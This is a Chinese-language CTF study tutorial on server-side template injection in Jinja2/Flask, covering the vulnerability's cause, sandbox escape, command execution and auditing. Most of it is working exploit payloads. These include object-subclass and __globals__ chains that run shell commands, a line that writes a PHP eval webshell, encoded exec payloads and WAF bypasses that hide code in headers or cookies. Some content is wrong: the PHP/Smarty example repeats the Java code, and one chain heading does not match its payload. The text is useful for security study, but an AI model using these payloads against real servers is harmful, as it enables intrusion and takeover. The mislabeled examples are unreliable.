# 1. 前置知识

## 1.1 漏洞成因

> 模板引擎对用户输入的不当处理，导致攻击者能够注入恶意的模板语法，被服务端模板引擎解析并执行，从而实现对服务器的攻击

### 1.1.1 MVC架构

- **Model（模型）** ：负责数据处理和业务逻辑
- **View（视图）** ：负责页面展示，通常使用模板引擎
- **Controller（控制器）** ：负责接收请求、调用模型、**返回视图**

### 1.1.2 模板引擎

**作用**：

将动态数据（如用户名、文章内容）嵌入到静态 HTML 模板中，生成最终的页面

**分类**：

- **Python 系**：Jinja2（Flask）、Tornado、Django Template
- **Node.js 系**：EJS、Pug（Jade）、Handlebars
- **Java 系**：Freemarker、Velocity、Thymeleaf
- **PHP 系**：Smarty、Twig、Blade

## 1.2 沙箱

### 1.2.1 概念

沙箱是模板引擎的一种安全机制，用于限制模板代码的执行权限，防止恶意代码访问敏感资源

### 1.2.2 机制

**Jinja2沙箱示例**：

```python
from jinja2.sandbox import SandboxedEnvironment

# 创建沙箱环境
env = SandboxedEnvironment()

# 在沙箱中渲染模板
template = env.from_string('{{ name }}')
output = template.render(name='Alice')
```

**沙箱限制**：

1. <u>禁止访问私有属性</u>：以 `_` 开头的属性（如 `__class__`、`__globals__`）
2. <u>禁止调用危险函数</u>：如 `eval()`、`exec()`、`__import__()`
3. <u>禁止文件操作</u>：如 `open()`、`file()`
4. <u>禁止网络操作</u>：如 `socket`、`urllib`

**沙箱局限**：

1. 沙箱并非绝对安全，可以通过对象属性链绕过

2. 许多开发者未启用沙箱，直接使用默认的非沙箱环境

3. 即使启用沙箱，也可能存在配置不当或版本漏洞

### 1.2.3 沙箱逃逸

这里是概念引入：以**为何不能直接`__import__('os').system(" ")`**为例

这是一段python代码，在Jinja2沙箱环境下不可直接执行

因为Jinja2不是直接运行 Python 代码，它有自己的变量作用域和上下文

在Jinja2的{{ }}内部,只能访问 

1. “模板上下文中明确传递进来的变量 

2. Jinja2 默认提供的一些过滤器和函数
3. 基础的 Python 对象类型（字符串、列表、字典等）

而`__import__`并不是Jinja2上下文默认提供的函数，所以直接调用会报错

不能直接调用，而我们绕过Jinja2的沙箱限制去调用的这个过程就是就是所谓的**沙箱逃逸**

## 1.3 python命令执行

重点是两个模块：**os** 和 **subprocess** 执行系统命令

| 模块         | 核心定位                    | 功能范围                                       | 使用场景                               |
| ------------ | --------------------------- | ---------------------------------------------- | -------------------------------------- |
| `os`         | 操作系统底层 “基础工具集”   | 文件 / 目录操作、环境变量、进程 ID、路径处理等 | 高频、简单的系统交互（无需启动新进程） |

### 1.3.1 os

>在Jinjia2模板中无法直接import os ,需通过Python内置的’对象属性查找‘间接获取‘os'模块
>
>(1)   {{__import__('os')}}   <作用：导入os模块并返回该模块对象>
>(2)   通过已存在的对象(如request)的模块链调用

#### os.system()

`{{__import__('os').system('命令')}}`

**返回值**：返回命令退出的状态码，但不会返回命令的输出结果。输出会直接打印到标准输出，不会存到Python变量里用于后续代码处理
**作用场景**：执行命令的动作本身，不获取命令结果。(比如某道题只需要命令执行成功就行，完全不需要页面的结果)

#### os.popen()

`{{ __import__('os').popen('命令').read() }}`

**返回值**：返回一个“文件对象”，需要用.read()或者.readlines()来获取命令的输出结果

> [!CAUTION]
> read()——读取单个字符串<feel读出来清晰>，readlines()——读取字符串列表<读出来在一块>

**作用场景**：需要读取并处理命令执行后的回显结果时‘

getattr 等价于 os.popen

### 1.3.2 subprocess

>（1） 无法直接import subprocess ,需通过Python内置的’对象属性查找‘间接获取‘subprocess'模块
>（2）功能较为单一，只专注于进程创建和通信，但因场景本身的复杂性(跨平台兼容，进程间通信等)，接口较为繁琐

#### subprocess.run()

 `{{__import__('subprocess').run(['命令'], stdout=__import__('subprocess').PIPE, encoding='utf-8').stdout}}`

最后的.stdout:属性，获取命令执行后的输出结果
**返回值**：

CompletedProcess对象，代表已完成的子进程。
包含子进程运行后的结果信息，常用属性有：

- <u>returncode</u>:子进程的退出码（0 表示成功）；
- <u>stdout</u>:子进程的标准输出（bytes 类型，需解码）；
- <u>stderr</u>：子进程的标准错误输出

**功能：**

执行args参数所表示的命令，等待命令结束，并返回一个CompletedProcess类型对象

**参数介绍：**

`subprocess.run(args,*,stdin=None,input=None,stdout=None,stderr=None,shell=False,timeout=None,check=False,encoding=None,errors=None)`

- <u>args</u>：表示要执行的命令，必须是字符串或字符串参数列表****
- <u>Stdin, ‘stdout‘, ’stderr’</u>：子进程的标准输入、输出和错误，其值可以是subprocess.PIPE, subprocess.DEVNULL, 一个已经存在的文件描述符、已经打开的文件对象或者None****
 - <u>timeout</u>：设置命令超时时间，若超时，子进程将被杀死，并弹出TimeoutExpired异常
- <u>check</u>：若该参数设为true，且进程退出状态码不是0，则弹出CalledProcessError异常
- <u>encoding</u>：若指定了该参数，则stdin,stdout,stderr可以接收字符串数据，并以该编码方式编码，否则只能接收bytes类型的数据****

- <u>shell</u>：若该参数为True，将通过操作系统的shell执行指定命令

**subprocess.PIPE**:管道，可传递给stdout,stdin,stderr参数
**subprocess.STDOUT**:特殊值，可传递给stderr参数，表示stdout和stderr合并输出，可以使用read(),readline(),readlines()等方法

#### subprocess.Popen()

`{{__import__('subprocess').Popen(['命令'], stdout=__import__('subprocess').PIPE, encoding='utf-8').stdout.read()}}`

为了防止不用communicate()直接stdout.read()容易死锁，可直接将stdout.read()替换为`communicate()[0]`,（标准防锁死写法）即：`{{__import__('subprocess').Popen(['命令'], stdout=__import__('subprocess').PIPE, encoding='utf-8').communicate()[0]}}`

**返回值**：

Popen对象，代表正在运行或已启动的子进程。
可以主动管理子进程的生命周期，常用的方法/属性：
<u>wait</u>：等待子进程结束，返回退出码；
<u>communicate</u>：与子进程交互(发送输入、获取输出)`****`尽量一定要用
**功能**：

其用法和参数与run()基本类同，可创建和管理子进程，但是它的返回值是一个Popen对象，而不是CompletedProcess对象
**参数介绍**：
`subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, group=None, extra_groups=None, user=None, umask=-1, encoding=None, errors=None, text=None)`
<u>args</u>：shell命令，可以是字符串或者字符序列
<u>bufsize</u>：缓冲区大小，默认-1，用于创建标准流的管道对象

- 0：不使用缓冲区
- 1：表示行缓冲，仅当universal_newlines=True时可用，即文本模式
- 正数：表示缓冲区大小

- 负数：表示使用系统默认的缓冲区大小
- <u>stdin, stdout, stderr</u>：分别表示程序的标准输入、输出、错误句柄
- <u>preexec_fn</u>：只在 Unix 平台下有效，用于指定一个可执行对象（callable object），它将在子进程运行之前被调用
- <u>shell</u>：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。<u>使用管道、通配符或重定向时，启用shell</u>
- <u>cwd</u>：用于设置子进程的当前目录。
- <u>env</u>：用于指定子进程的环境变量。如果 env = None，子进程的环境变量将从父进程中继承。

**可调用的方法**：(重要三个)

<u>poll()</u>：检查进程是否终止

<u>wait()</u>：等待子进程终止

<u>communicate(input, timeout)</u>：和子进程交互，发送和读取数据

- input的数据类型必须是字节串，若universal_newlines=True，则input参数的数据类型必须是字符串
- 该方法返回一个元组(stdout_data, stderr_data)，字节串或字符串
- timeout指定的秒数后该进程还没结束，将会抛出TimeoutExpired异常

| 函数                         | 使用说明                                                     |
| ---------------------------- | ------------------------------------------------------------ |
| subprocess.run()             | 执行 args 参数所表示的命令，执行完成后返回 CompletedProcess  |
| subprocess.call()            | 执行指定的命令，返回命令执行状态，类似 os.system (cmd)       |
| subprocess.check_call()      | 等价于 subprocess.run (...,check=True)                       |
| subprocess.check_output()    | 执行指定命令，状态码为 0 则返回命令执行结果，否则抛出异常    |
| subprocess.getoutput()       | 接收字符串格式的命令，执行并返回结果，类似于 os.popen (cmd).read () 和 commands.getoutput (cmd) |
| subprocess.getstatusoutput() | 执行 cmd 命令，返回元组（命令执行状态，命令执行结果输出）    |

## 1.4 python代码执行

eval()和exec()的对比：

| 特性         | eval()                       | exec()                         |
| ------------ | ---------------------------- | ------------------------------ |
| 处理对象     | 表达式                       | 语句                           |
| CTF          | 只能算简单的（计算器）       | 能跑复杂的（编译器）           |
| 返回值       | 有结果（Result）             | 无结果（None）                 |
| 取 Flag 策略 | 直接回显（`popen().read()`） | 反弹 Shell / 写文件 / 带外传输 |
| 赋值能力     | 不能 `a=1`                   | 可以 `a=1`                     |
| 导入能力     | 仅限行内（`__import__`）     | 完整（`import os`）            |
| 代码风格     | 必须一行写完                 | 写起来更像正常的写代码         |

### 1.4.1 eval()

>执行字符串类型的的表达式，并返回最终结果

一般在SSTI题目中，`{{}}`这个双大括号本身就起到了“执行代码”的作用。模板引擎会自动解析并执行括号里的Python对象的属性调用。
两种需要的情况：                                                                      

- （1） 当需要“把字符串变成代码”时
  某个payload是一个字符串形式（例如为了绕过WAF，把代码编码成了Hex或者Base64),就需要通过eval()来激活
  **位置**：{{ }}里的最外层——>{{eval('字符串代码')}}
- （2） 利用eval的特性执行复杂逻辑
  `{{ ... }}` 里的语法通常受限于模板引擎的解析规则（通常只能做简单的属性访问和函数调用）。如果需要执行复杂的多层嵌套或者动态生成的代码，`eval()` 提供了一个纯粹的 Python 执行环境。
  **位置**：作为利用链的终点——>`{{ [].__class__.__base__.__subclasses__()[...].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()") }}`
  **WAF绕过**：许多的题目可能会过滤 ’ 和 “ 。
- **（1）** 可以使用<u>chr(ASCII)</u>函数拼接
  eg:`eval(__import__(chr(111)+chr(115)).popen(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)).read())`

->`eval(__import__('os').popen('whoami').read())`

- **（2）** 还可以使用<u>HTTP传参</u>(HTTP传参加上模板语法这个组合是SSTI专属的)
  **原理**：利用模板引擎的解析能力，引用 Python Web 框架（如 Flask）的 `request` 对象，直接从 HTTP 请求中提取参数值作为字符串。
  **request.args.x**：获取get请求参数-GET
  **request.form.x**：获取表单数据-POST
  **request.values.x**： 获取所有参数-GET&POST
  **request.cookies.x**：获取 Cookie 数据

| 注入位置                                                     | Payload 写法                    | 配合的 HTTP 请求            | 特点                                             |
| ------------------------------------------------------------ | ------------------------------- | --------------------------- | ------------------------------------------------ |
| 通用                                                         | `{{ eval(request.values.x) }}`  | GET 或 POST 均可传 `x=...`  | 通用性高                                         |
| URL 参数                                                     | `{{ eval(request.args.x) }}`    | URL 后接 `?x=__import__...` | 直接构造                                         |
| POST 数据                                                    | `{{ eval(request.form.x) }}`    | Body 中传 `x=__import__...` | 需要用Hackbar/BP发包，URL只有payload没有恶意代码 |
| Cookie                                                       | `{{ eval(request.cookies.x) }}` | Cookie 头中传 `x=...`       | 隐蔽性高                                         |
|                                                              |                                 |                             |                                                  |
| eg:`http://ctf.com/?name={{eval(request.args.cmd)}}&cmd=__import__('os').popen('whoami').read()` |                                 |                             |                                                  |

```
GET: url?a=popen&b=ls

POST：code={{[].__class__.__base__.__subclasses__()[].__init__.__globals__[request.args.a](request.args.b).read()}}
```

**eval()的防御**：

**1.** 禁用__builtins__ ：在模板引擎中除去   

**2.** 沙箱隔离：用首先的python环境(例如PyPy沙箱)执行模板代码   

**3.** 输入过滤：严格禁用关键词（1/白名单过滤 2/主动移除或替换模板注入相关的关键词 3/特殊字符的转义处理 ）

**4.** 使用**ast.literal_eval()** 编写源码

>如果遇上ast.literal_eval,由于只允许数据结构，因而无法函数调用，导致无法直接RCE，所以如果能拿到外部的builtins就可以通过改常量(“变量覆盖” 或 “配置篡改”)的方式去打，即：突破口—覆盖关键配置(SECRET_KEY,DEBUG)、全局变量(如：jinja_env)>
>利用条件：解析后的数据被用于更新上下文

### 1.4.2 exec()

>执行存储在字符串或文件中的 Python语句，但是在执行完后不返回任何结果，**无返回值**

当payload需要执行多行代码、赋值操作等时，eval()由于只认表达式，所以无法执行，需要exec()。且在eval()被过滤，或者需要执行多行逻辑(如反弹shell)时，需要exec()。

- **（1）** 盲注/反弹shell/写文件(无回显利用)
  **1.** 反弹shell——使目标服务器连接我的   **2.** 写webshell/静态文件——把内容写入指定文件，eg:``open('static/shell.php','w').write('<?php eval($_POST["cmd"]);?>')`` <为避免引号冲突，将cmd的引号改为了双引号> **3.** 打印目标内容到指定文件：(简单payload)
  ``{{url_for.__globals__['__builtins__']['exec']("__import__('os').system('echo `env` > /app/static/1.txt')")}}``
- **（2）** 利用 `exec` 支持赋值的特性，将结果存入变量，再读取变量。
  **原理**：定义全局变量存储 `popen` 的结果。
  eg:``exec("global x; x=__import__('os').popen('cat /flag').read()")``
  读取：`{{url_for.__globals__['x']}}`
  **WAF绕过**：类似eval(),编码拼接和HTTP传参
- 前者：**python2**自带.decode('base64')或.decode('hex')；**pyhton3**移除字符串直接解码的方法，需要引入base64模块：
  （1)`exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=')` 
  （2）exec(bytes.fromhex('5f5f696d...').decode())
- 后者：

| 注入位置 | Payload                        | 理由                                                         |
| -------- | ------------------------------ | ------------------------------------------------------------ |
| 通用     | `{{ exec(request.values.x) }}` | 万能懒人包。<br><br>因为它同时接收 GET 和 POST。做题时起手就打这个，不用管是发 GET 包还是 POST 包，容错率最高。如果不确定用啥，就用它。 |
| POST     | `{{ exec(request.form.x) }}`   | 重型武器专用。<br><br>当你需要打反弹 Shell (通常 100 + 字符) 或者写长脚本时，URL 栏 (GET) 放不下，必须用 POST Body（form）传。 |

| 注入位置                                                     | payload                         | 理由                                                         |
| ------------------------------------------------------------ | ------------------------------- | ------------------------------------------------------------ |
| Header                                                       | `{{ exec(request.headers.x) }}` | 隐身衣。 有些 WAF 只盯着 URL 和 Body 查，完全不管 Header。而且 Header 允许传很长的字符串，适合藏反弹 Shell。 |
| Cookie                                                       | `{{ exec(request.cookies.x) }}` | 隐身衣 Pro。 原理同上，Cookie 位置更隐蔽，适合悄悄传参。     |
| **exec()的防御**：**1.** 作用域限制，使用 `exec(code, {'__builtins__':{}}, {})` 将 globals 置空，导致无法调用 `__import__` 或 `open`——突破口：可以通过继承链寻找未被禁用的模块进行沙箱逃逸   **2.** 静态审计，在执行前分析语法树，拦截call(调用)或import节点——突破口：利用字符串拼接或编码混淆AST结构   **3.** 彻底删除，在builtins中删除 |                                 |                                                              |

### 1.4.3 compile()

>主要起辅助作用，能够打破eval()的枷锁，将字符串编译成代码对象，但是编译结果需要用eval()或者exec()才能运行

当题目禁用了exec(),但是eval()只能执行表达式而不能执行语句（例如：赋值a=1，导入import)。这种情况下，eval()可以执行compile()编译出的代码对象（即使该对象是以exec模式编译的）
eg:`eval(compile("import os; os.system('ls')", '<string>', 'exec'))` 

## 1.5 过滤器

>在 Jinja2 中，变量可以通过“管道符” | 修改。
>语法是：{{ 变量 | 过滤器名称(参数) }}。
>本质上： 过滤器就是 Python 函数。
>Jinja2 引擎在渲染时，会把管道符前面的对象作为第一个参数传给过滤器函数。
>
>**模板写法：** `{{ name | upper }}`
>
>**Python 等价逻辑：** `upper(name)`

### `attr`：属性访问器

- **作用：** 获取对象的属性或方法。
- **Python 原型：** `getattr(obj, "name")`
- **用处**：代替了点（.）

| **正常写法 (被拦截)** | **过滤器写法 (绕过)** |
| --------------------- | --------------------- |
| `foo.bar`             | `foo|attr("bar")`     |
| `foo.bar()`           | `foo|attr("bar")()`   |

### `join`：连接器

- **作用：** 将一个序列（列表、元组、字典的键）连接成一个字符串。
- **Python 原型：** `"".join(list)`
- **好用之处** 配合 `dict` 使用，它可以**无中生有地创造字符串**，从而绕过单双引号限制。
- **对抗场景：** 禁用 `'` 和 `"` 时。
  **原理拆解：**

1. Jinja2 允许直接写 `dict(key=value)` 来创建字典。
2. Python 中迭代字典，默认迭代的是**键（Key）**。
3. `join` 过滤器把这些键拼起来，就变成了字符串。

```
dict(os=1)       -->  {'os': 1}
dict(os=1)|join  -->  "os"  (因为取的是键)
```

### `format`：格式化器

- **作用：** 类似于 Python 的字符串格式化。
- **Python 原型：** `"string %s" % (val)`
- **好用之处** 当你需要拼接复杂字符串，但 `+` 号被禁用时，或者需要构造特定字符（如 `%c`）时使用。

```python
"%c%c%c"|format(99,97,116)  -->  "cat"
```

### `first` / `last`

- **作用：** 取序列的第一个或最后一个元素。
- **替代：** `list[0]` 和 `list[-1]`。
- **场景：** 比如 `mro()` 返回一个列表，你想拿最后一个（通常是 `object`）或第一个。
  - `"".__class__.__mro__ | last` 等同于 `"".__class__.__mro__[-1]`

### `item`

注意：这是部分环境/旧版才有，或指 `map`

在标准 Jinja2 中没有 item 过滤器，通常我们用 __getitem__ 魔术方法来替代。
但在某些变种或自定义环境中，可能会有类似 map 或 select 来筛选数据。

### `list`

- **作用：** 把对象强转为列表。
- **场景：** 有些生成器或字典视图无法直接索引，先转成 `|list` 再取 `|first`。

### `length` / `count`

- **作用：** 返回长度。
- **场景：** 盲注（Blind SSTI）。有时候你看不到回显，只能通过判断长度对不对来推测 Flag。

# 2. 判定

## 2.1 白盒审计

### 2.1.1 危险函数

- **Python系（Flask/Jinja2）**

**render_template_string()**

```python
# 危险函数
render_template_string(user_input)  # 直接渲染用户输入
Template(user_input).render()       # Jinja2 原生方法

# 安全函数
render_template('template.html', data=user_input)  # 预定义模板
```

- **JAVA系（Freemarker）**

```java
// 危险函数
new Template("name", new StringReader(user_input), cfg).process(data, writer);

// 安全函数
cfg.getTemplate("template.ftl").process(data, writer);
```

- **PHP系（Smarty）**

```php
// 危险函数
new Template("name", new StringReader(user_input), cfg).process(data, writer);

// 安全函数
cfg.getTemplate("template.ftl").process(data, writer);
```

### 2.1.2 寻找注入点

**审计要点：**

1. <u>定位用户可控输入点</u>：GET/POST 参数、Cookie、HTTP 头、JSON 数据
2. <u>追踪数据流向</u>：输入 → 处理 → 模板渲染
3. <u>检查是否存在拼接</u>：用户输入是否直接拼接到模板字符串中

**示例：**

```python
@app.route('/profile')
def profile():
    # 步骤 1：定位用户输入
    username = request.args.get('name')  # ← 用户可控
    
    # 步骤 2：检查数据处理
    # 无过滤、无验证
    
    # 步骤 3：检查模板渲染
    template = f'<h1>Welcome {username}</h1>'  # ← 直接拼接
    return render_template_string(template)    # ← 危险函数
    
    # 结论：存在 SSTI 漏洞
```

# 3. 基础利用：攻击链

## SSTI魔术方法

| 魔术方法               | 作用                                                         | 返回值          | 示例                                                       |
| ---------------------- | ------------------------------------------------------------ | --------------- | ---------------------------------------------------------- |
| **`__class__`**        | 获取对象所属的类                                             | 类对象          | `''.__class__` → `<class 'str'>`                           |
| **`__base__`**         | 获取类的直接父类                                             | 父类对象        | `str.__base__` → `<class 'object'>`                        |
| **`__mro__`**          | 获取类的完整继承链                                           | 元组            | `str.__mro__` → `(<class 'str'>, <class 'object'>)`        |
| **`__subclasses__()`** | 获取类的所有子类                                             | 列表            | `object.__subclasses__()` → `[<class 'type'>, ...]`        |
| **`__init__`**         | 获取类的初始化方法                                           | 方法对象        | `str.__init__` → `<slot wrapper '__init__' ...>`           |
| **`__globals__`**      | 获取函数的全局命名空间                                       | 字典            | `func.__globals__` → `{'os': <module 'os'>, ...}`          |
| **`__builtins__`**     | 获取内置函数库                                               | 字典/模块       | `__builtins__` → `{'eval': <built-in function eval>, ...}` |
| **`__import__`**       | 动态导入模块                                                 | 模块对象        | `__import__('os')` → `<module 'os'>`                       |
| **`__doc__`**          | 获取函数或类的文档字符串，不可用则为 None，不被继承          | 字符串 / `None` | `print.__doc__` -> `print(value, ..., sep=" ", ...)`       |
| **`__name__`**         | 获取函数或类的名字                                           | 字符串          | `len.__name__ -> 'len'`                                    |
| **`__qualname__`**     | 获取函数或类的限定名称（Python 3.3+ 新功能）                 | 字符串          | `MyClass.func.__qualname__ -> 'MyClass.func'`              |
| **`__module__`**       | 函数或类定义的模块名，如果不可用则为 `None`                  | 字符串 / `None` | `os.path.join.__module__ -> 'posixpath'`                   |
| **`__defaults__`**     | 包含函数**位置参数**默认值的元组，无默认值则为 `None`        | 元组 / `None`   | `def f(a=1): pass; f.__defaults__ -> (1,)`                 |
| **`__code__`**         | 表示已编译函数体的代码对象                                   | 代码对象        | `func.__code__ -> <code object func at 0x...>`             |
| **`__globals__`**      | 对保存函数全局变量字典的引用（即定义该函数的模块的全局命名空间） | 字典            | `func.__globals__ -> {'os': <module 'os'>, ...}`           |
| **`__dict__`**         | 支持任意函数或对象属性的命名空间                             | 字典            | `obj.__dict__ -> {'attr_name': 100}`                       |
| **`__closure__`**      | 包含函数自由变量（闭包变量）绑定的单元格元组，否则为 `None`  | 元组 / `None`   | `inner_func.__closure__ -> (<cell at 0x...>,)`             |
| **`__annotations__`**  | 包含参数和返回值类型注释的字典（若提供返回值注释，键为 `'return'`） | 字典            | `func.__annotations__ -> {'a': int, 'return': str}`        |
| **`__kwdefaults__`**   | 包含**仅关键字参数** (Keyword-only) 默认值的字典             | 字典 / `None`   | `def f(*, k=1): pass; f.__kwdefaults__ -> {'k': 1}`        |
| **`__class__`**        | 获取实例化对象的原类                                         | 类对象          | `''.__class__ -> <class 'str'>`                            |
| **`__base__`**         | 获取该对象的基类（不一定能得到 `object`）                    | 基类对象        | `int.__base__ -> <class 'object'>`                         |
| **`__mro__`**          | 获取类的调用顺序（完整的继承链）                             | 元组            | `int.__mro__ -> (<class 'int'>, <class 'object'>)`         |

## 3.1 链条逻辑推理(小白向)

基本思路：**`对象 -> 类 -> Object类(基类) -> 子类(所有类) -> 找到含 os 的模块 -> 执行`**

```
{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

```
url_for.__globals__['os'].popen('cat flag').read()
```

### 1 地基——类、继承、实例化

#### 类、父类、子类和继承

- **类**：<蓝图/模具> 定义了事物的<u>属性(数据)</u>和<u>方法(行为)</u>
- **父类**：被其它类继承的类，封装了多个子类共有的属性和方法，实现代码复用(eg:动物类可以作为猫类，狗类的父类)
- **子类**：继承父类的属性与方法，同时可新增自身特有的功能，或重写父类方法以实现定制化逻辑（例如 “猫类” 继承 “动物类” 的 “发声” 方法，同时重写为 “喵喵叫”）
- **继承**：子类获取父类属性与方法的机制，核心作用是实现代码复用、逻辑分层，同时支持子类在父类基础上扩展或定制功能（例如 “动物类” 的属性和方法可被 “猫类”“狗类” 继承，避免重复编写通用逻辑）

#### 类的实例化

```
# --- 1. 定义父类 ---
class Father:
    pass

# --- 2. 定义子类 (继承自 Father) ---
class Son(Father):
    def action(self):
        print("I am the son")

# --- 3. 实例化 ---
# 这一步生成了一个实实在在的对象 
myself = Son()

# 调用方法
myself.action() # 输出：I am the son
```

### 2 攀爬——在对象中穿梭

> 最初通常掌握一个“实例”(比如一个空字符串“”或者一个空列表`[]`)

#### 通过实例获取其类

- **方法**：`实例.__class__`
- **意义**：让实例在运行时能直接指向所属的类，可快速获取 / 使用类的属性、方法

#### 获取父类

- **A**：`类.__base__` (获取首个直接父类)
- **B**：`类.__bases__` (一次性获取类的所有直接父类)
- **C**：`类.__mro__[]` (展示类的完整方法解析顺序) <找`object`基类时，列表最后一个元素（`[-1]`）更稳健；虽`str`的`object`常在`[1]`位，但实战优先用`mro[-1]`，也可观察 MRO 列表确定其位置>
- **意义**：找到所有类的始祖——object类

#### 获取子类

- **方法**：`类.__subclasses__()`
- 获取一个子类：`类.__subclasses__()[索引值]`
- **意义**：这是攻击链中最关键的“向下扩散”。一旦你拿到了 `object` 类，调用这个方法，你就能列出Python 解释器当前加载的所有类

### 3 突破——方法与全局空间

>找到了危险的子类后，我们需要利用它内部的函数（方法）来跳出限制

#### 获取类的某个方法

- **方法**：`类.方法名`或者`类.__dict__['方法名']`
- **用途**：寻找 `__init__` 方法，因为初始化方法几乎所有类都有，而且它通常会引用很多配置或模块
- `__init__`是类的构造方法，在创建类的实例（对象）时，自动执行，用来初始化实例的属性

#### 方法的全局命名空间(`__globals__`)

-  **解释**：函数（方法）自带的一个 “全局变量字典”—— 它会把该方法定义时所在文件/模块里的所有全局变量、导入的模块、其他函数等内容都存起来，相当于给方法留了一个 “定义环境的快照”，让方法在任何地方被调用时，都能找到定义时能用到的全局资源。
-  **用途**：“越狱关键”，假设找到了 os模块下的一个类的`__init__`方法。这个方法的 `__globals__` 字典里，一定包含os模块本身（或者system,popen等）,通过访问这个字典，你就等于拿到了os模块的控制权。
-  `__init__.__globals__`

### 4 `__builtins__`

**顾名思义**：内置的东西-内置工具箱
**解释**：特殊模块，里面装了 Python 启动时预加载的所有基础函数，比如 `print(), open(), range(), eval(), __import__()`
 几乎所有的 `__globals__` 字典里，都会包含一个指向 `__builtins__` 的引用

### 5 总结

- **`"".__class__`**

  - 从实例拿到 `str` 类。

- **`.__base__`**

  -  从 `str` 爬到 `object` 基类。

- **`.__subclasses__()`**

  -  从 `object` 向下找，列出所有子类。

- **`[138]` (假设索引)**

  -  挑选一个“危险子类”（比如 `os._wrap_close` 或 `warnings.catch_warnings`），这步实际上是在选取一个可以利用的类。

- **`.__init__`**

  -  拿到该类的初始化方法。

- **`.__globals__`**

  - 进入该方法所在的全局命名空间。**此时你已经突破了当前环境，进入了该类所在的模块环境。**

- **`['__builtins__']`**

  - 在全局变量中找到内置函数库。

- **`['eval']("__import__('os').popen('calc').read()")`**

  - 利用内置的 `eval` 执行任意代码。
    **示例**  `[]`相当于拿东西   ()相当于做动作

```
"".__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__']['eval']("...")
```

```
url_for.__globals__['__builtins__']['eval']("...")
# 是Flask框架特有的函数
```

> 字典(dict)的形态下，可以直接`['eval']`访问，但是在模块(module)形态下，需要用 .eval 或者 `.__dict__['eval']`

**心法**
向上爬(`__class__.__base__`)：为了获得上帝视角 (`object`)
向下扫(`__subclasses__`)：为了在成千上万的类中寻找“跳板”
进内部(`__init__.__globals__`)：为了从“类”的监狱逃逸到“模块”的自由空间
拿武器(`['__builtins__']['eval']`)：从系统自带工具箱里拿出代码执行器

进内部`(url_for.__globals__)`:原本监狱里摆了个梯子，通过这个梯子直接逃逸到“模块”的自由空间
拿武器(`['__builtins__']['eval']`)：从系统自带工具箱里拿出代码执行器

## 3.2 链条

### 3.2.1 完整链条

```
┌─────────────────────────────────────────────────────────────┐
│                  起点：'' (空字符串对象)                       │
└─────────────────────────────────────────────────────────────┘
                              ↓ __class__
┌─────────────────────────────────────────────────────────────┐
│                    <class 'str'> (str 类)                   │
└─────────────────────────────────────────────────────────────┘
                              ↓ __base__ 或 __mro__[1]
┌─────────────────────────────────────────────────────────────┐
│                  <class 'object'> (object 基类)              │
└─────────────────────────────────────────────────────────────┘
                              ↓ __subclasses__()
┌─────────────────────────────────────────────────────────────┐
│  [<class 'type'>, <class 'weakref'>, ...,                   │
│   <class 'os._wrap_close'>, ...]                            │
│  (当前 Python 环境加载的所有子类列表)                            │
└─────────────────────────────────────────────────────────────┘
                              ↓ [132] (选择危险子类)
┌─────────────────────────────────────────────────────────────┐
│              <class 'os._wrap_close'> (危险类)               │
└─────────────────────────────────────────────────────────────┘
                              ↓ __init__
┌─────────────────────────────────────────────────────────────┐
│        <function os._wrap_close.__init__> (初始化方法)        │
└─────────────────────────────────────────────────────────────┘
                              ↓ __globals__
┌─────────────────────────────────────────────────────────────┐
│  {'os': <module 'os'>, 'sys': <module 'sys'>, ...}          │
│  (该类所在模块的全局命名空间)                                    │
└─────────────────────────────────────────────────────────────┘
                              ↓ ['os'].popen('whoami')
┌─────────────────────────────────────────────────────────────┐
│              <os.popen object> (命令执行对象)                 │
└─────────────────────────────────────────────────────────────┘
                              ↓ .read()
┌─────────────────────────────────────────────────────────────┐
│                    'root\n' (命令执行结果)                    │
└─────────────────────────────────────────────────────────────┘
```

### 3.2.2 经典链条

- **通过config对象**

```python

{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}

# 逐步解析：
# ''                        → 空字符串对象

```

- **通过lipsum (Jinja2内置对象)**

```python
{{lipsum.__globals__.__builtins__['eval']('__import__("os").popen("whoami").read()')}}
```

# 5. WAF绕过

## 5.1 符号过滤绕过

### 5.1.1 无点( . )绕过

**过滤场景**：WAF 检测到 `.` 符号，认为是**属性访问**，直接拦截



##### **中括号`[' ']`**

**原理**：Python 中 `obj.attr` 等价于 `obj['attr']`，中括号访问不需要点号

```python
# 原始 Payload
{{''.__class__.__base__.__subclasses__()}}

# 绕过后
{{''['__class__']['__base__']['__subclasses__']()}}
```

完整链路示例：

```python
{{''['__class__']['__base__']['__subclasses__']()[132]['__init__']['__globals__']['popen']('whoami')['read']()}}
```

##### **`|attr()`过滤器**

**原理**：Jinja2 的 `attr()` 过滤器可以动态获取对象属性，语法为 `obj|attr('属性名')`

```python
# 单层
{{''|attr('__class__')}}

# 多层嵌套
{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

完整链路示例：

```python
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('whoami')|attr('read')()}}
```

使用`|attr()`过滤器，完全不用点号，而且还可配合**`request.args`**传参

##### **`getattr()`函数**

**原理**：Python 内置函数 `getattr(obj, 'attr')` 等价于 `obj.attr`

```python
# 单层
{{getattr('', '__class__')}}

# 多层嵌套
{{getattr(getattr(getattr('','__class__'),'__base__'),'__subclasses__')()}}
```

完整链路示例：

```python
{{getattr(getattr(getattr(getattr(getattr(getattr('','__class__'),'__base__'),'__subclasses__')()[132],'__init__'),'__globals__')['popen']('whoami'),'read')()}}
```

##### **`__getattribute__()`**

**原理**：Python 对象的底层属性访问方法

```python
{{''.__getattribute__('__class__').__getattribute__('__base__')}}
```

### 5.1.2 无下划线( _ )绕过

